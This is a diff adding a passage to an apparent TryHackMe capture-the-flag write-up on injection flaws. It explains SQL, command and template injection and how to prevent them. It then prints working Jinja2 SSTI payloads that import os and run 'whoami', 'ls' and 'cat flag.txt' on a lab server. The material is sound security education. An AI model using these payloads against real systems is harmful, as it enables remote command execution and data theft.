@@ -63,5 +63,69 @@ I created a small python script `decode.py` which bruteforces letters and number
 
 <img width="808" height="625" alt="image" src="https://github.com/user-attachments/assets/2f4590fc-b3b8-4971-9b7c-31a294c9295d" />
 
+## A05: Injection
+
+**What is Injection?**
+
+Injection occurs when an application takes user input and mishandles it. Instead of processing the input securely, the application passes it directly into a system that can execute commands or queries, such as a database, a shell, a templating engine or API.
+
+You are likely familiar with SQL Injection, where an attacker inserts an SQL query into an application's logic, such as a login form, which then gets processed by the database. This happens when the web application fails to sanitise user input and instead uses it to construct the query. For instance, taking the "username" input on a login form and directly using it to query the database.
+
+The following are some classic examples of injection that you may be familiar with:
+- SQL Injection
+- Command Injection
+- AI Prompts
+- Server Side Template Injection (SSTI)
+
+Command Injection is a vulnerability that allows an attacker to execute operating system (OS) commands on a server by supplying malicious input to an application.
+
+SSTI happens when a web application treats user input as template code instead of plain text, allowing an attacker to execute template expressions or even server-side code.
+
+**How to Prevent Injection**
+
+Preventing injection starts by ensuring that user input is always treated as untrusted. Rather than parsing directly, instead, take elements of the input for querying. When writing SQL queries, developers should use prepared statements or parameterized queries instead of joining user input directly into the SQL query. For OS commands, avoid functions that pass input directly to the system shell, and instead rely on safe APIs and processes that don’t invoke the shell at all.
+
+Input validation and sanitisation play a crucial role in preventing these types of attack. Escape dangerous characters, enforce strict data types and filter before the application even processes the input.
+
+---
+
+### Practical
+
+Today's practical will showcase command injection. This example illustrates Server Side Template Injection (SSTI). You will abuse an application's ability to render dynamic content to retrieve a flag stored on the machine hosting the application.
+
+You can access this portion of the practical on `http://MACHINE_IP:8000`.
+
+---
+
+### Recommended TryHackMe Content
+
+If you'd like to explore this type of attack in much further depth, we highly recommend the following TryHackMe content: [Injection Attacks Module](https://tryhackme.com/module/injection-attacks)
+
+---
+
+### Answer the questions below
+
+Perform an SSTI attack on the practical. You need to read the contents of flag.txt that is located within the same directory as the web application.
+
+Navigating to the page gives us SSTI Page.
+
+We first confirm the SSTI Vulnerability by writing `{{7*7}}` which gives us 49 that confirms the vulnerability that it does not checks the inputs very good.
+
+Then we see the user of the system by `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}` which gives us `root` which is a good sign.
+
+Then doing the `ls` command to check the files, we get `flag.txt`: 
+
+`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}`
+
+<img width="412" height="329" alt="image" src="https://github.com/user-attachments/assets/d7837905-8dac-4699-bf6c-180962d1b882" />
+
+Check the contents of `flag.txt`: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}`
+
+<img width="1660" height="649" alt="image" src="https://github.com/user-attachments/assets/fac72550-f2ff-4cb3-9664-ff945b416870" />
+
+
+
+
+
 
 
